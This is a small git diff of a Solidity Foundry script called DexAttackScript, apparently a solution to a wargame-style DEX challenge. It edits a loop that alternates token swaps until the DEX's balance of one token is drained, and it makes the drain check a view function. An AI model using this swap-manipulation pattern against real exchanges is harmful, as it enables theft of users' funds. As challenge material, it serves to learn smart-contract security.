@@ -19,7 +19,7 @@ contract DexAttackScript is Script {
         bool drained;
 
         while (!drained) {
-            toggle ? Dex(dexInstance).swapToken(token1, token2) : Dex(dexInstance).swapToken(token2, token1);
+            toggle ? swapToken(token1, token2) : swapToken(token2, token1);
             toggle = !toggle;
             drained = isDexDrained();
         }
@@ -48,7 +48,7 @@ contract DexAttackScript is Script {
         console.log("DEX TOKEN 2 BALANCE AFTER:", SwappableToken(token2).balanceOf(dexInstance));
     }
 
-    function isDexDrained() public returns (bool) {
+    function isDexDrained() public view returns (bool) {
         return SwappableToken(token1).balanceOf(dexInstance) == 0 || SwappableToken(token2).balanceOf(dexInstance) == 0;
     }
 }
